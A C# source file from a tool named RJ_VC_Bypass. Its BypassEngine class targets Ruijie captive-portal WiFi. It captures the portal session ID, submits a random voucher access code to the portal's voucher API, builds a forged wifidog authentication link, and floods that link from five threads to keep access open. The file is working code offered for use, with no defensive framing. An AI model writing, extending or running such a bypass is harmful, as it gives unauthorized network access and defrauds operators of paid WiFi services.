using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace RJ_VC_Bypass;

/// <summary>
/// Event args for log messages
/// </summary>
public class LogEventArgs : EventArgs
{
    public string Message { get; set; } = string.Empty;
}

/// <summary>
/// Event args for status updates
/// </summary>
public class StatusEventArgs : EventArgs
{
    public string Status { get; set; } = string.Empty;
}

/// <summary>
/// Main bypass engine - handles portal detection and authentication bypass
/// </summary>
public class BypassEngine : IDisposable
{
    private bool _isRunning;
    private CancellationTokenSource? _cancellationTokenSource;
    private readonly HttpHelper _httpHelper;
    private string _lastAuthLink = string.Empty;
    private readonly List<Task> _pingTasks = new();
    private const int PING_THREADS = 5;

    public event EventHandler<LogEventArgs>? LogReceived;
    public event EventHandler<StatusEventArgs>? StatusReceived;

    public bool IsRunning => _isRunning;
    public string CapturedSid { get; private set; } = string.Empty;

    public BypassEngine()
    {
        _httpHelper = new HttpHelper();
    }

    /// <summary>
    /// Start the bypass engine
    /// </summary>
    public void Start()
    {
        if (_isRunning) return;

        _isRunning = true;
        _cancellationTokenSource = new CancellationTokenSource();

        SendLog("> Engine Started...");
        SendStatus("BYPASSING...");

        _ = Task.Run(() => RunInjectionEngine(_cancellationTokenSource.Token));
    }

    /// <summary>
    /// Stop the bypass engine
    /// </summary>
    public void Stop()
    {
        _isRunning = false;
        _cancellationTokenSource?.Cancel();
        _cancellationTokenSource?.Dispose();
        _cancellationTokenSource = null;
        _lastAuthLink = string.Empty;

        SendLog("> Engine Stopped by User");
        SendStatus("DISCONNECTED");
    }

    /// <summary>
    /// Main injection engine loop
    /// </summary>
    private async Task RunInjectionEngine(CancellationToken ct)
    {
        try
        {
            while (!ct.IsCancellationRequested && _isRunning)
            {
                // Check if already connected to real internet
                if (await _httpHelper.CheckInternetConnection())
                {
                    SendStatus("CONNECTED");
                    SendLog("> Internet is OK. Monitoring...");

                    while (!ct.IsCancellationRequested && _isRunning && await _httpHelper.CheckInternetConnection())
                    {
                        await Task.Delay(10000, ct);
                    }

                    if (_isRunning && !ct.IsCancellationRequested)
                    {
                        SendLog("> [!] Connection lost. Re-evaluating...");
                        SendStatus("RECONNECTING...");
                    }
                    continue;
                }

                // Detect captive portal
                SendLog("> Detecting Captive Portal...");

                try
                {
                    var response = await _httpHelper.GetAsync("http://connectivitycheck.gstatic.com/generate_204");

                    if (response.StatusCode == HttpStatusCode.NoContent)
                    {
                        await Task.Delay(5000, ct);
                        continue;
                    }

                    string portalUrl = response.RequestMessage?.RequestUri?.ToString() ?? string.Empty;
                    string pageContent = await response.Content.ReadAsStringAsync();

                    if (portalUrl.Contains("generate_204"))
                    {
                        await Task.Delay(5000, ct);
                        continue;
                    }

                    SendLog("> Portal Detected: " + portalUrl);

                    // Extract SID
                    string sid = ExtractSid(portalUrl, pageContent);

                    // Follow JS redirect if present
                    var jsMatch = Regex.Match(pageContent, @"location\.href\s*=\s*['""']([^'""']+)['""']");
                    if (jsMatch.Success)
                    {
                        string path = jsMatch.Groups[1].Value.Replace("&amp;", "&");
                        var baseUri = new Uri(portalUrl);
                        var nextUrl = new Uri(baseUri, path);

                        var jsResponse = await _httpHelper.GetAsync(nextUrl.ToString());
                        portalUrl = jsResponse.RequestMessage?.RequestUri?.ToString() ?? portalUrl;
                        pageContent = await jsResponse.Content.ReadAsStringAsync();
                        sid = ExtractSid(portalUrl, pageContent);
                    }

                    if (!string.IsNullOrEmpty(sid))
                    {
                        CapturedSid = sid;
                        SendLog("> Ruijie SID Found: " + sid);

                        // Save SID to config
                        SaveSid(sid);

                        // Try voucher API auth
                        var portalBase = new Uri(portalUrl);
                        string apiUrl = $"{portalBase.Scheme}://{portalBase.Host}/api/auth/voucher/";

                        string randomAccess = new Random().Next(100000, 999999).ToString();
                        string jsonStr = $"{{\"accessCode\":\"{randomAccess}\",\"sessionId\":\"{sid}\",\"apiVersion\":1}}";

                        try
                        {
                            var apiResponse = await _httpHelper.PostJsonAsync(apiUrl, jsonStr);
                            SendLog($"> Voucher API Auth: {(int)apiResponse.StatusCode}");
                        }
                        catch
                        {
                            SendLog("> Voucher API Fail");
                        }

                        // Extract gateway info
                        string gwAddr = ExtractParam(portalUrl, "gw_address", "192.168.110.1");
                        string gwPort = ExtractParam(portalUrl, "gw_port", "2060");
                        string macAddr = ExtractParam(portalUrl, "mac", "");
                        string ipAddr = ExtractParam(portalUrl, "ip", "");

                        var authLinkBuilder = new StringBuilder();
                        authLinkBuilder.Append($"http://{gwAddr}:{gwPort}/wifidog/auth?token={sid}");

                        if (!string.IsNullOrEmpty(macAddr))
                            authLinkBuilder.Append($"&mac={macAddr}");
                        if (!string.IsNullOrEmpty(ipAddr))
                            authLinkBuilder.Append($"&ip={ipAddr}");

                        string authLink = authLinkBuilder.ToString();

                        if (authLink != _lastAuthLink)
                        {
                            _lastAuthLink = authLink;
                            StartPingThreads(authLink, ct);
                        }

                        // Verify connection
                        SendLog("> Verifying Connection...");
                        bool isBypassed = false;
                        for (int i = 0; i < 5; i++)
                        {
                            await Task.Delay(3000, ct);
                            if (!ct.IsCancellationRequested && await _httpHelper.CheckInternetConnection())
                            {
                                isBypassed = true;
                                break;
                            }
                        }

                        if (isBypassed)
                        {
                            SendLog("> SUCCESS: Network Bypassed!");
                            SendStatus("CONNECTED");

                            while (!ct.IsCancellationRequested && _isRunning && await _httpHelper.CheckInternetConnection())
                            {
                                await Task.Delay(10000, ct);
                            }
                        }
                        else
                        {
                            SendLog("> ⏳ Reconnecting...");
                            SendStatus("RECONNECTING...");
                            _lastAuthLink = string.Empty;
                            await Task.Delay(3000, ct);
                        }
                    }
                    else
                    {
                        SendLog("> SID Not Found. Retrying...");
                        await Task.Delay(5000, ct);
                    }
                }
                catch (Exception ex)
                {
                    SendLog($"> Error: {ex.Message}");
                    await Task.Delay(5000, ct);
                }
            }
        }
        catch (OperationCanceledException)
        {
            SendLog("> Engine cancelled");
        }
        catch (Exception ex)
        {
            SendLog($"> Engine Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Start parallel ping threads to keep auth alive
    /// </summary>
    private void StartPingThreads(string link, CancellationToken ct)
    {
        SendLog("> Launching Turbo Threads...");

        for (int i = 0; i < PING_THREADS; i++)
        {
            var task = Task.Run(async () =>
            {
                while (!ct.IsCancellationRequested && _isRunning && link == _lastAuthLink)
                {
                    try
                    {
                        var headers = new Dictionary<string, string>
                        {
                            { "User-Agent", AppConfig.USER_AGENT },
                            { "Connection", "keep-alive" }
                        };
                        await _httpHelper.GetAsync(link, headers);
                    }
                    catch { }

                    await Task.Delay(150, ct);
                }
            }, ct);
            _pingTasks.Add(task);
        }
    }

    /// <summary>
    /// Extract session ID from URL or content
    /// </summary>
    private string ExtractSid(string url, string content)
    {
        var match = Regex.Match(url, @"sessionId=([a-zA-Z0-9]+)");
        if (match.Success) return match.Groups[1].Value;

        match = Regex.Match(content, @"sessionId=([a-zA-Z0-9]+)");
        if (match.Success) return match.Groups[1].Value;

        return string.Empty;
    }

    /// <summary>
    /// Extract parameter from URL
    /// </summary>
    private string ExtractParam(string url, string paramName, string defaultVal)
    {
        try
        {
            var match = Regex.Match(url, $@"{paramName}=([^&]+)");
            if (match.Success) return match.Groups[1].Value;
        }
        catch { }
        return defaultVal;
    }

    /// <summary>
    /// Send log event
    /// </summary>
    private void SendLog(string message)
    {
        LogReceived?.Invoke(this, new LogEventArgs { Message = message });
    }

    /// <summary>
    /// Send status event
    /// </summary>
    private void SendStatus(string status)
    {
        StatusReceived?.Invoke(this, new StatusEventArgs { Status = status });
    }

    /// <summary>
    /// Save SID to config file
    /// </summary>
    private void SaveSid(string sid)
    {
        try
        {
            AppConfig.EnsureDataPath();
            File.WriteAllText(Path.Combine(AppConfig.DataPath, "sid.txt"), sid);
        }
        catch { }
    }

    /// <summary>
    /// Load last saved SID
    /// </summary>
    public static string LoadSavedSid()
    {
        try
        {
            string path = Path.Combine(AppConfig.DataPath, "sid.txt");
            if (File.Exists(path))
                return File.ReadAllText(path);
        }
        catch { }
        return string.Empty;
    }

    public void Dispose()
    {
        Stop();
        _httpHelper.ToString(); // Trigger disposal check
        GC.SuppressFinalize(this);
    }
}
